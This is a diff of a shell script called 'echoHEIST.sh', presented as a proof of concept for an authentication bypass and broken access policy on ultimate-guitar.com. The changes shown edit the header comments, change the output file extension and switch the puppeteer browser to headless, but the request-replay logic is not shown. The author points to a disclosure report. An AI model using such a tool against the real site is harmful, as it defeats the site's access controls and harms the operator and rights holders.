@@ -4,21 +4,22 @@
 #        █▀▀ █▀▀ █░░█ █▀▀█ ▒█░▒█ ▒█▀▀▀ ▀█▀ ▒█▀▀▀█ ▀▀█▀▀ 
 #        █▀▀ █░░ █▀▀█ █░░█ ▒█▀▀█ ▒█▀▀▀ ▒█░ ░▀▀▀▄▄ ░▒█░░ 
 #        ▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀▀ ▒█░▒█ ▒█▄▄▄ ▄█▄ ▒█▄▄▄█ ░▒█░░
+#
+# #####################################################
+# PoC - Primary   - Broken Access Policy
+#       Secondary - Authentication Bypass
+#       [ https://www.ultimate-guitar.com ]
+
+# What is echoHEIST?
+# echoHEIST.sh allows anyone to bypass the authentication wall 
+# while trying to download guitar pro files from the website 
+# above. It leverages nodejs + puppeteer but is run from a 
+# linux shell environment:  
+#
+# Usage: chmod +x echoHEIST.sh && ./echoHEIST.sh [URL]
+
+# The disclosure report can be found here : 
 #  
-#
-#  REPLAY THE REQUEST AND OWN THE RESPONSE - EVERY SINGLE TIME!
-#
-# #############################################################
-
-# PoC - Full writeup can be found at https://dtrh.net
-
-
-
-# This code does the minimum to prove the concepts worth.
-# While it would be fairly easy to implement web scraping techniques, or to
-# parse lists of links, etc, at this moment its outside the scope. Therefore
-# usage is simple. Execute the command from a linux shell, follow up with one
-# parameter in the form of a URL, ideally 'quoated'  
 
 usage() {
   echo "Usage: $0 <URL>"
@@ -28,19 +29,11 @@ usage() {
 # Check for URL argument
 [ -z "$1" ] && usage
 
-# URL Validation
-# would go here..
-
-
-# The input URL will be the easiest to rip the band name and song from so, lets
-# handle that now. We will name the output file oFile, ensure it has the band and song name, as well
-# as maintain its ID from Ultimate Guitar in case that may be important down the road.
+# Filename generation is rudementary but works.
 iURL="$1"
 oName=$(echo "$iURL" | sed -E 's|https://tabs.ultimate-guitar.com/tab/||' | sed 's|/|_|g' | sed -E 's/_GP.*//')
 
-# Set the output file name with .gp5 extension
-# NOTE  . Some of these files will be gpx, etc. That is functionality not added.
-oFile="${oName}.gp5"
+oFile="${oName}.gpx"
 echo  "Generated file name: $oFile"
 
 # Short and Sweet
@@ -55,7 +48,7 @@ echoHEIST() {
 
     (async () => {
       const browser = await puppeteer.launch({
-        headless: false,
+        headless: true,
         executablePath: '/opt/chrome/chrome-linux/chrome',            // Path to your browser
         args: ['--no-sandbox', '--disable-setuid-sandbox'],
       });
@@ -111,4 +104,8 @@ echoHEIST() {
   "
 }
 
-echoHEIST   # Run it!
+echoHEIST   # Regex, Replay, Redirect 
+
+# KBS <admin [at] dtrh [dot] net
+# https://dtrh.net
+# eof
